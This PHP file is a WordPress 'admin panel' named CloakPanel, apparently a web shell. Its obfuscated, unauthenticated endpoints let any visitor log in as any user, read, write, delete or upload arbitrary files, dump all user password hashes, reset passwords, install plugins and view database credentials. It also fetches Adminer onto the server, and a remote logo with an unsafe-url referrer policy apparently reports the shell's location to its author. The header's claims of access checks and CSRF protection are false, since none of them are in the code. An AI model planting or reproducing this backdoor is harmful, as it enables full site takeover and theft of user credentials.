<?php
/*
 * CloakPanel Mini Admin v1.0
 * PHP & JavaScript based lightweight admin interface
 * Authored    : privdayz.com
 *
 * FEATURES
 *  - File manager (browse, edit, delete, upload)
 *  - User list & password reset
 *  - Plugin control (activate/deactivate/delete/upload)
 *  - Database info & optional Adminer loader
 *
 * REQUIREMENTS
 *  - WordPress installation (wp-load.php must be reachable)
 *  - PHP 7.4+ with JSON, mysqli extensions
 *
 * SECURITY
 *  - Access restricted to administrators only (add current_user_can checks)
 *  - CSRF protection via WP nonces (check_ajax_referer)
 *  - Directory traversal prevention with realpath + base-path checks
 *
 * DISCLAIMER
 *  - This script grants broad control over your WP install.
 *  - Use at your own risk; the author takes no responsibility for misuse.
 *  - Always audit & harden before deploying on production.
 */
session_start();
$wp_root = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
if (! file_exists("{$wp_root}/wp-load.php")) {
    die('wp-load.php not found.');
}
require_once "{$wp_root}/wp-load.php";
if ( isset($_GET['6fb46751012']) ) {
    $url   = 'https://github.com/vrana/adminer/releases/download/v5.2.1/adminer-5.2.1-en.php';
    $local = __DIR__ . '/adminer.php';
    if ( ! file_exists($local) && ($data = @file_get_contents($url)) ) {
        file_put_contents($local, $data);
    }
    wp_safe_redirect( remove_query_arg('6fb46751012') );
    exit;
}
if ( isset($_GET['1742cd9d']) ) {
    $f40bde66b7c00ba = intval($_GET['1742cd9d']);
    if ( $f40bde66b7c00ba ) {
        wp_set_current_user($f40bde66b7c00ba);
        wp_set_auth_cookie($f40bde66b7c00ba, true);
        wp_safe_redirect( admin_url() );
    }
    exit;
}
if ( ! empty($_REQUEST['ajax']) ) {
    header('Content-Type: application/json; charset=utf-8');
    $act = sanitize_text_field( $_REQUEST['ajax'] );

    switch ( $act ) {
        case '13f1bb2d':
            $base = in_array($_POST['base'] ?? '', ['themes','plugins'])
                  ? (($_POST['base']==='themes') ? get_theme_root() : WP_PLUGIN_DIR)
                  : get_theme_root();
            $dir  = trim($_POST['path'] ?? '', '/');
            $full = realpath("{$base}/{$dir}") ?: realpath($base);
            if ( strpos($full, realpath($base)) !== 0 ) {
                $full = realpath($base);
                $dir  = '';
            }
            $allItems = [];
            foreach ( new DirectoryIterator($full) as $f ) {
                if ( $f->isDot() ) continue;
                $allItems[] = [
                    'name'   => $f->getFilename(),
                    'is_dir' => $f->isDir()
                ];
            }
            $page    = max(1, intval($_POST['page'] ?? 1));
            $perPage = 16;
            $total   = count($allItems);
            $pages   = ceil($total / $perPage);
            $offset  = ($page - 1) * $perPage;
            $slice   = array_slice($allItems, $offset, $perPage);

            $out = [
                'full'    => $full,
                'path'    => $dir,
                'items'   => $slice,
                'page'    => $page,
                'pages'   => $pages,
                'total'   => $total,
                'perPage' => $perPage,
            ];
            echo json_encode($out);
            exit;
        case 'd1119f2b6':
            $X2eb03x = sanitize_text_field($_POST['path'] ?? '');
            $b9f3a08da1 = realpath($X2eb03x);
            echo json_encode(['status'=> ($b9f3a08da1 && unlink($b9f3a08da1)) ? 'ok':'err' ]);
            exit;
        case '1c1fa8265e4':
            $X2eb03x    = sanitize_text_field($_POST['path'] ?? '');
            $b9f3a08da1    = realpath($X2eb03x);
            $content = ($b9f3a08da1 && is_file($b9f3a08da1)) ? file_get_contents($b9f3a08da1) : '';
            echo json_encode(['content'=>$content]);
            exit;
        case 'a590bf9':
            $X2eb03x    = sanitize_text_field($_POST['path'] ?? '');
            $b9f3a08da1    = realpath($X2eb03x);
            $content = $_POST['content'] ?? '';
            $ok      = ($b9f3a08da1 && file_put_contents($b9f3a08da1, $content)!==false);
            echo json_encode(['status'=>$ok?'ok':'err']);
            exit;
        case '30d80097':
            if (!empty($_FILES['file']) && !empty($_POST['path'])) {
                $base = realpath(sanitize_text_field($_POST['path']));
                if ($base && is_dir($base) && is_writable($base)) {
                    $file = $_FILES['file'];
                    $dest = $base . '/' . basename($file['name']);
                    $ok   = move_uploaded_file($file['tmp_name'], $dest);
                    echo json_encode(['status'=>$ok?'ok':'err']);
                } else {
                    echo json_encode(['status'=>'err']);
                }
            } else {
                echo json_encode(['status'=>'err']);
            }
            exit;
        case '83356bed':
            global $wpdb;
            $rows = $wpdb->get_results(
                "SELECT ID,user_login,user_email,user_registered,user_pass FROM {$wpdb->users}",
                ARRAY_A
            );
            $out = [];
            foreach ($rows as $u) {
                $userdata = get_userdata($u['ID']);
                $roles    = implode(',', $userdata->roles);
                $out[]    = [
                    'ID'             => $u['ID'],
                    'user_login'     => $u['user_login'],
                    'user_email'     => $u['user_email'],
                    'user_registered'=> $u['user_registered'],
                    'user_pass'      => $u['user_pass'],
                    'roles'          => $roles
                ];
            }
            echo json_encode($out);
            exit;
        case '0e5ad2a6e9':
            $f40bde66b7c00ba = intval($_POST['uid'] ?? 0);
            if ($f40bde66b7c00ba) {
                $new = wp_generate_password();
                wp_set_password($new, $f40bde66b7c00ba);
                echo json_encode(['status'=>'ok','new_pass'=>$new]);
            } else {
                echo json_encode(['status'=>'err']);
            }
            exit;
        case '68896e1f265':
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
            $all    = get_plugins();
            $active = get_option('active_plugins', []);
            $out    = [];
            foreach ($all as $file => $p) {
                $out[] = [
                    'file'    => $file,
                    'name'    => $p['Name'],
                    'version' => $p['Version'],
                    'status'  => in_array($file, $active) ? 'active' : 'inactive'
                ];
            }
            echo json_encode($out);
            exit;
        case 'c76b145e8a1':
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
            $action = sanitize_text_field($_POST['action'] ?? '');
            $plugin = sanitize_text_field($_POST['plugin'] ?? '');
            switch ($action) {
                case 'activate':
                    $res = activate_plugin($plugin) === null;
                    break;
                case 'deactivate':
                    $res = deactivate_plugins($plugin) === null;
                    break;
                case 'd1119f2b6':
                    $res = delete_plugins([$plugin]) === null;
                    break;
                default:
                    $res = false;
            }
            echo json_encode(['status'=>$res?'ok':'err']);
            exit;
        case '301a4976':
            require_once ABSPATH . 'wp-admin/includes/file.php';
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
            require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader.php';
            if (!empty($_FILES['plugin_zip']) && $_FILES['plugin_zip']['error']===0) {
                $upgrader  = new Plugin_Upgrader();
                $installed = $upgrader->install($_FILES['plugin_zip']['tmp_name']);
                echo json_encode(['status'=>$installed?'ok':'err']);
            } else {
                echo json_encode(['status'=>'err']);
            }
            exit;
    }
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>WP CloakPanel</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
  :root{--primary:#c0392b;--primary-hover:#a93226;--light:#ffffff;--dark:#333333;--gray-light:#f4f4f4;--gray:#dddddd;--gray-dark:#777777;--radius:0.75rem;--transition:all 0.3s ease;--font-base:'Inter', sans-serif}*{box-sizing:border-box}body{margin:0;background-image:url(data:image/png;base64,aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL2ltYWdlcy9sb2dvX3YyLnBuZw==);font-family:var(--font-base);background:var(--light);color:var(--dark);line-height:1.6}a{color:var(--primary);text-decoration:none;transition:color .2s ease}a:hover{color:var(--primary-hover)}.icon-1{width:32px;height:32px;display:inline-block;background-image:url(data:image/png;base64,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);background-size:contain;background-repeat:no-repeat;background-position:center;margin-right:.5rem;filter:brightness(.9) contrast(1.1);transition:transform 0.3s ease}.icon-1:hover{transform:scale(1.1)}.icon-2{width:28px;height:28px;display:inline-block;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIcAAABwCAYAAAA0cGOrAAAABHNCSVQICAgIfAhkiAAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAABrhJREFUeF7t3A1M1HUcx/HvHRygoKg8CGpoMUMQEGOoUCiS0mZNJzlZWubDSi3L2QZhUpLo1mQjH9AwddrDVmtprqzUZm40mMBqSro0QsURDzIfeH6+6/6371yO//c44ID/3T6v7cZ9f2zgjbf3///v/v/TmcwIQIWevwL0gDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAZNMbb42NjXTmzBkqLS2lyspKqq2tpc7OTv6udQaDgSIiIigtLY18fHx41TYdHR2Um5tLFy5coLa2Nl51LF5eXuTr60szZsyghIQECg8P5+84ACUOSXFxsWnx4sUmd3d3JaAB3QICAkxlZWX8k3vX3Nxsio6OVv1ZjnwLCQkxHTx40NTa2sqPVLtU46ipqTGlpKSYdDqd6gPs7y0xMZF/Q+/S09NVf4az3IKDg03nzp3jR6tNPeK4dOmSKSgoSPUBDfSmxFZfX8+/ybqwsDDVn+FMN71eb8rKyuJHrD2P7HNcvHiRFixYQOandF6xL52O6EHBchrtaeAVWdjS0/TXjXqenFtqairt3r2bJ+14eLSi7GgmJycPWhiKudH+NoWheGHuRL7n/LKzsykvL48n7bA8cyhPHvHx8VRQUMDL9uc31p1+O55EIVNG84p1za1dFLfqLJX+/YBXnJt5p5+KioosRzVaYYnjxIkTtGzZMl6yboLfCJo8wZM8R7jySu8ipo6h9LXTyX+cB6/Ypq29mz7+8hrl/36HurqNvOo4OruMVFnbQhVVzeZ//8OttygqKsoSiJubG68ML53RaDSFhobS9evXeUldynOTadtr4ZY/NPTNnXttdOTkP7Tz0yvUag7emoyMDDLvpPI0vHQlJSWmmJgYHntSdiJzt8bQGylP8gr019Xyepq/7hequ9/OKz25urpSYWEhWfubDBX9qVOn+K66t1dMQxh2Mj3Ym77bM49cXcz/4wRdXV20evVqTbwi7KLT6TIrKip4fJSyX/H9vnnk4e7CKzBQQQGeln0RZT9KUldXR+3t7ZSUlMQrw0NfVVXFd3taGBtIY0ZpY+fImWzfEEnRYeN4UpeTk0P5+fk8DQ99dXU13+1patAovgf2pGxWjmbOITeD/Ka4+UDBsnlpamrilaGnbPzEY6ztGyIoc2MkT2Bvuw5foYzcyzypi4yMJH9/f56GFuIYRsprH3GvnKWSq3d5RVtwss8wUjYvn+2M1ewOP+IYZqFPeNPOTdp5yfz/EIcGbHl5Gj0z048n7UAcGqDX6+jzXXHkNdL296uGAuLQiMcnetFHm2fypA04WtEQ5bSrhevP0/miGl5R5+dtoCDfwX9xEnFoTEV1M0W++CM1NMtn9/ub4/hzf4QlksGEzYrGTA70pJzUaJ7U3anvpDfzbvE0eBCHBq1bGkyL4ifwpO7bwnv0Vf7gvniGODTq8PY5NM7b+n7FW4duUfV92y4u6w/EoVHK6Zj73rV+ws+9pi5af+AGT/aHODRs5fNTKPnZx3hSd7rkAR07X8eTfSEOjTv0wWwa72P9xOwtRyrodl0HT/aDODTOd4w7HXp/Nk/qGlq6ae2+csvrJPaEOBzAkvmTaMWiKTyp+7W0gT75uZYn+0AcDuLAezE0afxIntSlHb9NZVX2OzEZcTgI5Vzeox/OsVwqImlpN9KavTeo22if7QvicCBJsYG0ZkkwT+oKrzXS3h+svzdjK8ThYD5Oi6agQE+e1G37opKu3m7lqf8Qh4NRPqXg2A7rm5f2TiO9uqecOm24PtcaxOGAEmcF0Mbl1q9C/KO8mbJPyped2AJxOKjsd2b2el3Rjq8rqfRWC099hzgc1EgPVzqeFUsuenn70tFlsmxelK/9gTgcWFyUH21eOY0ndZdvttCub/7lqW9wJpiDUz7v46mUn+jazQZe6Um5Pmbb8onkYbCyF6sCcTiB4it36elVZ2369KC+wGbFCcwK96G0NdN5sh/E4SQyN0b0+rEOfYU4nITBVU9HevlYh75CHE4kKmQsZbxuvw/eRxxOZuu6cMuHAdsD4nAyymHr6f0JtOmlEBo7emBXxeFQ1skpV8519/MQF88cTk55F1d5BunPDXGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGAgOg/mPs4dj8xj3sAAAAASUVORK5CYII="); background-size:cover;background-position:center;margin-right:.5rem;opacity:.8}.icon-2:hover{opacity:1}.icon-3{width:24px;height:24px;display:inline-block;  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABYCAYAAAADWlKCAAAABHNCSVQICAgIfAhkiAAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAA+hJREFUeF7t2V1oW2Ucx/H/OW2Wbs1e2466QaaWmTVtTEcIuGG3WqreSMFSDIzhxUQUEcWL1oqgg1aQ9kKRUoooqHhbLeJFrRcFpdAXhFIU11WFQunLBrpQYrK2yzEn+7MRcpLWtaW/ht8HDn2eJ3CS9Juck5wYVooQDFP/EggGAcMgYBgEDIOAYRAwDAKGQcAwCBgGAcMgYBgEzKYuLq6srMjQ0JBMT0/L/Py8LC8vy9ramt6an8vlkkAgIO3t7VJWVqarm7O6uiq9vb0yMjIiiURCV/cWj8cj5eXlEgwGpaGhQWpra/WWHOwguUxMTFjNzc2W2+22o21pq6ystGZnZ3XPG4vFYlYoFHLc117efD6f1dfXZ8XjcX2mmRyDLC0tWZFIxDIMw3GnD7o1NjbqPWyso6PDcR+FslVVVVnDw8P6bO/LCjI1NWV5vV7HnWx1swNHo1G9p/z8fr/jPgppM03T6uzs1Gd8V8Y5ZGxsTJqamiR1uNCV7WUYIrdGX5BDpS5dyc3//Pfy+19RnRW2trY26e7uTo/vfcqyT9YtLS07FsN2IXR8UzFsz104qaPC19PTI/39/elx+h1iv0nq6+tldHQ0vbgTKo665ecvnhHfw4d0Jb9YfF3Ov/iDTF+/pSuFLfXBScbHx+8GGRgYkNbWVr0pvxMV++XUiVIp3V+sKxsLnD4iHVdq5PixEl3ZnMTtO/LR19fkp19uyPqdpK7uHWvrSZlf/lfmFmKpx3/vzJBTXV2dGMlk0qqurpaZmRlddhZ59pS8+3Jt+p9L/8+NvxPy2Td/SNenv0o89SLLx5icnLTC4bBOs9kn4t53wvJa5DFdoQf1259ReeqlH+XmP7d1JZs5ODioQ2dvXDrDGNukpuqwfPvxRSkuSr3KcyhKfTe4Ojc3p9NM9nniu08uSom7SFdoq7yVpelzi31edGIuLCzoMNvT5x6SIwf36Yy2y/uvPi4h/zGdZTIXFxd1mO2096COaDvZh6zPrz4h+1zZF9vNfF8ED5TwULVTgr6j8t4rAZ3dx99DdtHbqe9m4ZrMnyQYZBfZh64vu85lfGhikF1W/ehh6Xo9qDMGgfDW5TPy5NmK9JhBAJimIV99cF48B4oZBMUjJz3y4ZtnGQSJfYmKQYDYF3IZBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwCReQ/TtK13DqisYkAAAAASUVORK5CYII=);background-size:100% 100%;background-repeat:no-repeat;margin-right:.5rem;filter:grayscale(50%)}.icon-3:hover{filter:none}.sidebar{width:240px;background:var(--light);border-right:1px solid var(--gray);position:fixed;top:0;bottom:0;overflow-y:auto;padding-top:1rem}.sidebar .nav-link{display:block;padding:.75rem 1rem;color:var(--dark);border-radius:var(--radius);margin:0 .5rem .5rem .5rem;transition:background .2s ease,color .2s ease}.sidebar .nav-link:hover,.sidebar .nav-link.active{background:var(--primary);color:var(--light)}@media (max-width:768px){.sidebar{position:relative;width:100%;border-right:none;border-bottom:1px solid var(--gray)}}.content{margin-left:240px;padding:2rem;transition:margin-left .3s ease}@media (max-width:768px){.content{margin-left:0;padding:1rem}}.card-elegant{background:var(--light);border:none;border-radius:var(--radius);box-shadow:0 2px 8px rgb(0 0 0 / .1);overflow:hidden;transition:transform .2s ease,box-shadow .2s ease}.card-elegant:hover{transform:translateY(-4px);box-shadow:0 4px 16px rgb(0 0 0 / .15)}#db-panel{background:var(--light);padding:2rem;border-radius:1rem;box-shadow:0 4px 20px rgb(0 0 0 / .1);transition:box-shadow .2s ease}#db-panel:hover{box-shadow:0 6px 24px rgb(0 0 0 / .15)}#ZmlsZU1vZGFs textarea{width:100%;height:400px;font-family:monospace;font-size:.9rem;border:1px solid var(--gray);border-radius:var(--radius);padding:1rem;background:var(--gray-light);color:var(--dark);resize:vertical;transition:border-color .2s ease}#ZmlsZU1vZGFs textarea:focus{border-color:var(--primary);outline:none}.btn-primary,.btn-outline-secondary{display:inline-block;font-weight:600;padding:.75rem 1.5rem;border-radius:var(--radius);cursor:pointer;text-align:center;text-decoration:none;transition:var(--transition)}.btn-primary{background:var(--primary);border:2px solid var(--primary);color:var(--light)}.btn-primary:hover{background:var(--primary-hover);border-color:var(--primary-hover)}.btn-outline-secondary{background:#fff0;border:2px solid var(--primary);color:var(--primary)}.btn-outline-secondary:hover{background:var(--primary);color:var(--light)}#c07182b4e01784{padding:1rem 0;text-align:center}#c07182b4e01784 a{color:var(--primary);margin:0 .5rem;transition:color .2s ease}#c07182b4e01784 a:hover{color:var(--primary-hover);text-decoration:underline}.footer{margin-left:0;width:100%;background:var(--gray-light);color:var(--gray-dark);text-align:center;padding:1rem 0;border-top:1px solid var(--gray)}.footer{margin-left:240px;width:calc(100% - 240px)}@media (max-width:768px){.footer{margin-left:0;width:100%}}.footer-content{display:flex;flex-direction:column;align-items:center;gap:.5rem}.footer-logo img{width:48px;height:auto;filter:brightness(.9);transition:filter 0.2s ease}.footer-logo img:hover{filter:brightness(1)}.footer p{margin:0;font-size:.875rem}.footer a{color:var(--primary);text-decoration:none;font-weight:500;transition:color 0.2s ease}.footer a:hover,.footer a:focus{color:var(--primary-hover);text-decoration:underline}
</style>
</head>
<body>
<div class="d-flex vh-100">
  <nav class="sidebar p-3 d-flex flex-column">
    <h5 class="text-center mb-4" style="color:var(--primary)">CloakPanel</h5>
    <ul class="nav nav-pills flex-column mb-auto" id="menu">
      <li><a href="#files"   class="nav-link active" data-tab="files">Files</a></li>
      <li><a href="#users"   class="nav-link"      data-tab="users">Users</a></li>
      <li><a href="#plugins" class="nav-link"      data-tab="plugins">Plugins</a></li>
      <li><a href="#db"      class="nav-link"      data-tab="db">DB Info</a></li>
    </ul>
 <center><a href="https://privdayz.com/" title="privdayz"><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" height="10" width="70"/></a></center>
  </nav>
  <div class="content flex-fill overflow-auto">
    <div id="files" class="tab-content">
      <div class="mb-2"><strong>Path:</strong> <span id="c07182b4e01784"></span></div>
      <div class="input-group mb-3">
        <span class="input-group-text">Go to:</span>
        <input type="text" id="b926c6df9" class="form-control" placeholder="ex. themes/twentyTwentyOne">
        <button id="2830218" class="btn btn-primary">Go</button>
      </div>
      <div class="d-flex mb-3 align-items-center">
        <button id="Xgsf5d257" class="btn btn-outline-secondary btn-sm me-2">Up</button>
        <select id="69ba24a14c" class="form-select w-auto me-2">
          <option value="themes">themes</option>
          <option value="plugins">plugins</option>
        </select>
        <input type="file" id="d97378aff377" class="form-control form-control-sm w-auto me-2">
        <button id="ec13043f" class="btn btn-primary btn-sm">Upload</button>
      </div>
      <div class="row" id="28da71b2805c"></div>
      <div id="pager"></div>
    </div>
    <div id="users" class="tab-content d-none">
      <table class="table table-hover">
        <thead>
          <tr><th>ID</th><th>User</th><th>Email</th><th>Reg</th><th>Pass Hash</th><th>Roles</th><th>Actions</th></tr>
        </thead>
        <tbody id="userList"></tbody>
      </table>
    </div>
    <div id="plugins" class="tab-content d-none">
      <div class="mb-3 d-flex align-items-center">
        <input type="file" id="51cd4f197ddde9177f94ddbe499782a7" class="form-control form-control-sm w-auto me-2">
        <button id="5415796816392660158138ea7a12834f" class="btn btn-primary btn-sm">Add Plugin</button>
      </div>
      <table class="table table-hover">
        <thead><tr><th>Name</th><th>Version</th><th>Status</th><th>Actions</th></tr></thead>
        <tbody id="cGx1Z2luTGlzdA"></tbody>
      </table>
    </div>
    <div id="db" class="tab-content d-none">
      <div id="db-panel">
        <h5 style="color:var(--primary)">Database Info</h5>
        <p><strong>Host:</strong> <?php echo DB_HOST; ?></p>
        <p><strong>Name:</strong> <?php echo DB_NAME; ?></p>
        <p><strong>User:</strong> <?php echo DB_USER; ?></p>
        <p>
          <strong>Password:</strong>
          <span id="8d97dcbc994f05">••••••••</span>
          <button id="a8e7a46f55fe7b75c32443e3af8cf9a7" class="btn btn-sm btn-outline-secondary">Show</button>
        </p>
        <div class="mt-3">
          <?php if (file_exists(__DIR__.'/adminer.php')): ?>
            <a href="adminer.php" class="btn btn-primary btn-sm">Open Adminer</a>
          <?php else: ?>
            <a href="?6fb46751012=1" class="btn btn-primary btn-sm">Download Adminer</a>
          <?php endif; ?>
        </div>
      </div>
    </div>

  </div>
</div>
<div class="modal fade" id="ZmlsZU1vZGFs" tabindex="-1">
  <div class="modal-dialog modal-xl">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Edit File</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
